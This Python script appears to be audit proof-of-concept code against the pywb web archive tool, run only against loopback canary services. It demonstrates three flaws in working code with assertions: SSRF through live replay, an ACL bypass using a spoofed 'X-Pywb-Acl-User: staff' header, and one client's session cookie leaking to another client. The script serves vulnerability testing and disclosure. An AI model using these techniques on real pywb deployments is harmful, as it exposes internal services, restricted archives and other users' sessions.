#!/usr/bin/env python3
"""Loopback-only PoCs for three additional pywb trust-boundary failures."""

from gevent.monkey import patch_all

patch_all()

import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

import requests

from pywb.apps.frontendapp import FrontEndApp
from pywb.utils.geventserver import GeventServer, RequestURIWSGIHandler


REPO_ROOT = Path(__file__).resolve().parents[1]
ACL_CONFIG = REPO_ROOT / "tests" / "config_test_access.yaml"
if not ACL_CONFIG.exists():
    ACL_CONFIG = REPO_ROOT / "pywb" / "tests" / "config_test_access.yaml"

SECRET = "INTERNAL_SECRET_1073"
COOKIE_SECRET = "TOP_SECRET_1073"


class CanaryHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = urlsplit(self.path).path
        if path == "/secret":
            body = SECRET.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif path == "/login":
            body = b"logged in"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header(
                "Set-Cookie",
                f"session={COOKIE_SECRET}; Domain=nip.io; Path=/",
            )
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif path == "/whoami":
            body = self.headers.get("Cookie", "").encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_error(404)

    def log_message(self, *args):
        pass


def start_pywb(config_file, custom_config=None):
    app = FrontEndApp(config_file=str(config_file), custom_config=custom_config)
    server = GeventServer(
        app,
        port=0,
        hostname="127.0.0.1",
        handler_class=RequestURIWSGIHandler,
    )
    return app, server


def main():
    upstream = ThreadingHTTPServer(("127.0.0.1", 0), CanaryHandler)
    upstream_thread = threading.Thread(target=upstream.serve_forever, daemon=True)
    upstream_thread.start()
    upstream_url = f"http://test.localhost:{upstream.server_port}"
    cookie_upstream_url = f"http://127.0.0.1.nip.io:{upstream.server_port}"
    apps = []

    try:
        with tempfile.TemporaryDirectory(prefix="pywb-other-pocs-") as tmp:
            config = Path(tmp) / "config.yaml"
            config.write_text("debug: false\n", encoding="utf-8")

            # 1. Live-mode SSRF: no allowlist/filter is configured.
            app, server = start_pywb(
                config, {"collections": {"live": "$live"}}
            )
            apps.append(app)
            session = requests.Session()
            session.trust_env = False
            response = session.get(
                f"http://127.0.0.1:{server.port}/live/id_/{upstream_url}/secret",
                timeout=5,
            )
            assert response.status_code == 200, response.status_code
            assert response.text == SECRET, response.text
            print("PASS F-06: live replay fetched an internal canary service (SSRF)")
            app.warcserver_server.stop()
            server.stop()

            # 2. ACL identity spoofing: the same restricted WARC is blocked
            # anonymously and released by an untrusted request header.
            app, server = start_pywb(ACL_CONFIG)
            apps.append(app)
            url = f"http://127.0.0.1:{server.port}/pywb/mp_/http://www.iana.org/about/"
            denied = session.get(url, timeout=5)
            allowed = session.get(
                url, headers={"X-Pywb-Acl-User": "staff"}, timeout=5
            )
            assert denied.status_code == 451, denied.status_code
            assert allowed.status_code == 200, allowed.status_code
            print("PASS F-05: spoofed ACL header changed HTTP 451 to HTTP 200")
            app.warcserver_server.stop()
            server.stop()

            # 3. Cross-user cookie bleeding: client B has no login cookie in its
            # own session, but the upstream receives client A's test cookie.
            app, server = start_pywb(
                config, {"collections": {"live": "$live"}}
            )
            apps.append(app)
            client_a = requests.Session()
            client_a.trust_env = False
            client_b = requests.Session()
            client_b.trust_env = False
            login = client_a.get(
                f"http://127.0.0.1:{server.port}/live/mp_/{cookie_upstream_url}/login",
                timeout=5,
            )
            assert login.status_code == 200, login.status_code
            whoami = client_b.get(
                f"http://127.0.0.1:{server.port}/live/mp_/{cookie_upstream_url}/whoami",
                timeout=5,
            )
            assert whoami.status_code == 200, whoami.status_code
            assert f"session={COOKIE_SECRET}" in whoami.text, whoami.text
            print("PASS F-07: client B inherited client A's live-session cookie")
            app.warcserver_server.stop()
            server.stop()
    finally:
        upstream.shutdown()
        upstream.server_close()
        upstream_thread.join(timeout=5)
        for app in apps:
            app.warcserver_server.stop()

    print("All three additional high-impact PoCs passed")


if __name__ == "__main__":
    main()
